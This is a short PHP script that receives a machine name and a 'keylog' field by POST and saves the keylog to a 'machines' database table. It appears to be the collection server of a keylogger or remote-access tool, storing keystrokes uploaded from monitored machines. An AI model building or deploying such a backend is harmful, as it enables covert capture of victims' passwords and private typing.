<?php
require('../config/config.php');

if (isset($_POST['name'])) {
	$machine = $_POST['name'];
	$keylog = $_POST['keylog'];
	
    $conn = connect_to_db();
	
	$query = "UPDATE machines SET keylog=? WHERE name=?";
	$stmt = $conn->prepare($query);
	$stmt->bind_param('ss', $keylog, $machine); 
	$stmt->execute();
	
	$conn->close();
}
?>